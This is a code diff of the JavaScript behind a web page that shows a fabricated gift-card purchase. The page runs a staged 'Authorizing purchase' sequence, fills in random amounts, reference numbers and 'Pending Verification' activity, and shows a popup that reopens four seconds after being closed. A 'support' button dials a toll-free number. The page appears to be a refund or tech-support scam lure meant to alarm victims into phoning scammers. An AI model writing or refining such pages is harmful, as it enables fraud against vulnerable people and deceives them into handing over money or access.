-      requestAnimationFrame(step);
-    }
-
-  }
-
-  requestAnimationFrame(step);
-}
-
-function randomIP(){
-
-  return ri(1,255)+'.'+
-         ri(1,255)+'.'+
-         ri(1,255)+'.'+
-         ri(1,255);
 }
 
 function gen(){
 
-  let val=r(100,900);
+  let ref=randomRef();
 
-  animate(document.getElementById('amt'), val);
-  animate(document.getElementById('mAmt'), val);
+  let currentDate = formatDate();
 
-  let ref='REF-'+
-  Math.random()
-  .toString(36)
-  .substr(2,8)
-  .toUpperCase();
+  /* GENERATE RANDOM AMOUNT */
+  let amount = generateAmount();
 
+  /* UPDATE REFERENCES */
   document.getElementById('ref').innerText=ref;
   document.getElementById('ref2').innerText=ref;
 
-  document.getElementById('inv').innerText=
-  'INV-'+ri(100000,999999);
+  /* UPDATE DATES */
+  document.getElementById('date').innerText=currentDate;
+  document.getElementById('date2').innerText=currentDate;
 
-  let ip=randomIP();
+  /* UPDATE CARD AMOUNT */
+  document.querySelector('.card-amount').innerText =
+  '$' + amount;
 
-  document.getElementById('ip').innerText=ip;
-  document.getElementById('ip2').innerText=ip;
+  /* UPDATE MAIN PAGE AMOUNT */
+  document.getElementById('amt').innerText =
+  '$' + amount;
 
-  document.getElementById('date').innerText=formatDate();
-  document.getElementById('date2').innerText=formatDate();
+  /* UPDATE VALUE SECTION */
+  document.querySelector('.info').innerHTML = `
+    <div><b>ITEM:</b> Digital Gift Card</div>
 
-  let stores=[
-    "Amazon",
-    "Walmart",
-    "BestBuy",
-    "Nike",
-    "Zara",
-    "Adobe",
-    "Netflix",
-    "eBay",
-    "Apple",
-    "Target"
+    <div><b>VALUE:</b> $${amount}.00</div>
+
+    <div><b>STATUS:</b> Pending Verification</div>
+
+    <div><b>REFERENCE:</b> <span id="ref">${ref}</span></div>
+
+    <div><b>DATE:</b> <span id="date">${currentDate}</span></div>
+
+    <div><b>DEVICE:</b> Secure Desktop Session</div>
+  `;
+
+  /* UPDATE GRID PURCHASE AMOUNT */
+  document.querySelectorAll('.grid-value')[1].innerText =
+  '$' + amount + '.00';
+
+  let items=[
+    "Digital Store",
+    "Gift Card Activation",
+    "Purchase Verification",
+    "Media Purchase",
+    "Digital Delivery",
+    "Wallet Authorization"
   ];
 
   let html='';
 
-  for(let i=0;i<10;i++){
+  for(let i=0;i<6;i++){
+
+    let activityAmount =
+    (Math.random()*120+20).toFixed(2);
 
     html += `
+    <div class="activity">
 
-<div style="
-display:flex;
-justify-content:space-between;
-align-items:center;
+      <div>
 
-padding:18px 20px;
+        <div class="activity-name">
+          ${items[i]}
+        </div>
 
-background:#ffffff;
+        <div class="activity-sub">
+          Secure Digital Processing
+        </div>
 
-border:1px solid #e5e7eb;
-border-left:4px solid #0070e0;
+      </div>
 
-border-radius:14px;
+      <div style="
+      font-weight:700;
+      ">
+        $${activityAmount}
+      </div>
 
-box-shadow:
-0 2px 10px rgba(0,0,0,.03);
-">
-
-  <div>
-
-    <div style="
-    font-weight:700;
-    color:#111827;
-    margin-bottom:4px;
-    font-size:15px;
-    ">
-      ${stores[i]}
     </div>
-
-    <div style="
-    font-size:13px;
-    color:#6b7280;
-    ">
-      Secure Transaction Verification
-    </div>
-
-  </div>
-
-  <div style="
-  font-weight:700;
-  color:#111827;
-  font-size:16px;
-  ">
-    -$${r(10,200).toFixed(2)}
-  </div>
-
-</div>
-
-`;
+    `;
 
   }
 
-  document.getElementById('ledger').innerHTML=html;
+  document.getElementById('activity').innerHTML=html;
+
 }
 
-/* FLOW */
+/* LOADING FLOW */
 setTimeout(()=>{
 
-  document.getElementById("status").innerText="Authorizing...";
+  document.getElementById("status").innerText =
+  "Authorizing purchase...";
 
 },1500);
 
 setTimeout(()=>{
 
-  document.getElementById("status").innerText=
-  "Authorization Complete";
+  document.getElementById("status").innerText =
+  "Verification complete";
 
 },3000);
 
 setTimeout(()=>{
 
-  document.getElementById("start").style.display="none";
+  // hide loading screen
+  document.getElementById("start").style.display =
+  "none";
 
-  document.getElementById("loader")
+  // show header
+  document.getElementById("header")
   .classList.remove("hidden");
 
+  // generate purchase info
+  gen();
+
+  // show popup after delay
   setTimeout(()=>{
 
-    document.getElementById("loader")
-    .style.display="none";
+    const modal =
+    document.getElementById("modal");
 
-    document.getElementById("header")
-    .classList.remove("hidden");
+    modal.classList.remove("hidden");
 
-    document.getElementById("modal")
-    .classList.remove("hidden");
+    void modal.offsetWidth;
 
-    gen();
+    const box =
+    document.querySelector(".modal-box");
 
-  },1500);
+    box.style.animation = "none";
+
+    void box.offsetWidth;
+
+    box.style.animation =
+    "modalIn .58s cubic-bezier(.2,.8,.2,1) forwards";
+
+  },2000);
 
 },4000);
 
+/* CLOSE MODAL */
 function openFull(){
 
-  document.getElementById('modal')
-  .style.opacity='0';
+  const modal = document.getElementById("modal");
 
-  document.getElementById('modal')
-  .style.pointerEvents='none';
+  // Hide popup
+  modal.classList.add("hidden");
 
-  setTimeout(()=>{
+  // Show again after 4 seconds
+  setTimeout(() => {
 
-    document.getElementById('modal')
-    .style.display='none';
+    modal.classList.remove("hidden");
 
-  },300);
+    const box = document.querySelector(".modal-box");
+
+    box.style.animation = "none";
+    void box.offsetWidth;
+
+    box.style.animation =
+      "modalIn .58s cubic-bezier(.2,.8,.2,1) forwards";
+
+  }, 4000); // 4000ms = 4 seconds
 
 }
 
-function goBack(){
+/* SUPPORT */
+function callSupport(){
 
-  document.getElementById('page2')
-  .classList.add('hidden');
+  window.location.href =
+  "tel:18443767271";
 
-  document.getElementById('modal')
-  .style.display='flex';
-}
-
-function downloadPDF(){
-
-  let element=document.getElementById('pdfArea');
-
-  html2pdf()
-  .from(element)
-  .save("transaction.html");
 }
 
 </script>
